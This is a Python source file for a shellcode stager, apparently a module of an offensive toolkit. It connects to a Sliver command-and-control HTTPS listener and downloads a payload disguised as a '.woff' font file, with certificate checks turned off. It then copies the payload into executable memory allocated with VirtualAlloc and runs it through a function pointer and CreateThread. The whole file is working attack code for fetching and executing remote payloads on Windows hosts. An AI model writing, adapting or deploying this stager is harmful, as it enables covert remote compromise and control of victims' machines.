import utils.arg
from utils.helper import nstate as nstate
from time import sleep
import ctypes.wintypes
#import sys
#import argparse
#import socket
import requests
#import struct
import ctypes

class stager():
    
    Author = 'psycore8'
    Description = 'Connect to a Sliver HTTPS listener, download stage and execute'
    Version = '0.0.1'
    MEM_COMMIT_RESERVE = 0x00003000
    PAGE_READWRITE_EXECUTE = 0x00000040
    kernel32 = ctypes.windll.kernel32
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
    VirtualAlloc.restype = ctypes.wintypes.LPVOID
    RtlMoveMemory = kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    RtlMoveMemory.restype = None
    CreateThread = kernel32.CreateThread
    CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.wintypes.DWORD, ctypes.c_int]
    CreateThread.restype = None
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    WaitForSingleObject.restype = None

    def __init__(self, remote_host=str, remote_port=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        #self.timeout = timeout
        #self.architecture = architecture
        #self.sleeptime = sleeptime

    def init():
        spName = 'sliver-stage'
        # flag, name, choices=, action=, default=, type, required, help)
        spArgList = [
            #['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
            ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
            ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to e.g. 192.168.2.1']
            #['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed']
            #['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
        ]
        utils.arg.CreateSubParserEx(spName, stager.Description, spArgList)

    def process(self):
        #static_url = 'https://172.17.253.140:9911/ObjectFile.woff'
        static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            response = requests.get(static_url, stream=True, verify=False)
            response.raise_for_status()
            stage_data = response.content
            print(f'{stage_data[0:16]}')
            print(f"Stage downloaded, size: {len(stage_data)}")
        except requests.exceptions.RequestException as e:
            print(f"Error during stage download: {e}")
        stage_start = stage_data.find(b'\x00')
        stage_buffer = bytearray(stage_data[stage_start + 1:])
        print(f'Stage length: {len(stage_buffer)} - {stage_buffer[0:16]}')
        ptr = self.VirtualAlloc(0, len(stage_buffer), self.MEM_COMMIT_RESERVE, self.PAGE_READWRITE_EXECUTE)
        buf = (ctypes.c_char * len(stage_buffer)).from_buffer(stage_buffer)
        if buf:
            self.RtlMoveMemory(ptr, buf, len(stage_buffer))
            ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
            ptr_f()
            ht = self.CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(0))
            self.WaitForSingleObject(ht, 1)
        else:
            print('buffer not valid!')

    